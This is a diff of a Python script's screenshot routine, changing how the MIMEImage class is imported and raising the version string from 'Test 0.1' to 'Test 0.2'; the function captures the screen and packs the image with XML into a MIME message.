@@ -1,15 +1,13 @@
 #!/usr/bin/env python3
-import io, uuid, hmac, hashlib, mss
+import io, uuid, hmac, hashlib, mss,email.mime.image
 from functions import *
 from PIL import Image
 import xml.etree.cElementTree as ET
 from bs4 import BeautifulSoup
-
-version = "Test 0.1"
-from email.mime.image import MIMEImage
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
+version = "Test 0.2"
 
 def TakeScreenShot():
     with mss.mss() as sct:
@@ -82,7 +80,7 @@ def TakeScreenShot():
 
         #######Test
         msg = MIMEMultipart()
-        imgMime = MIMEImage(imgByteArr.getvalue())
+        imgMime = email.mime.image.MIMEImage(imgByteArr.getvalue())
         msg.attach(imgMime)
         XMLText = BeautifulSoup(ET.tostring(root), "xml").prettify()
         TextMime = MIMEText(XMLText)
